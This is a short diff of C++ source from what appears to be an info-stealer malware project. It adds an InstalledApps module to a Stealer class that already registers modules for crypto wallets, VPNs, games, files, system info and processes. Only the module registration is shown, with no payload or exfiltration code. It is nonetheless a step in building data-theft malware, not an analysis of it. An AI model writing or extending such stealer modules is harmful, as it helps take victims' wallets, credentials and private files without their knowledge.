@@ -11,6 +11,7 @@
 #include "impl/crypto/Crypto.h"
 #include "impl/vpns/VPNs.h"
 #include "impl/games/Games.h"
+#include "impl/InstalledApps.h"
 #include <thread>
 
 void Stealer::registerModules() {
@@ -22,6 +23,7 @@ void Stealer::registerModules() {
     this->modules.push_back(new Files());
     this->modules.push_back(new Info());
     this->modules.push_back(new Processes());
+    this->modules.push_back(new InstalledApps());
 }
 
 
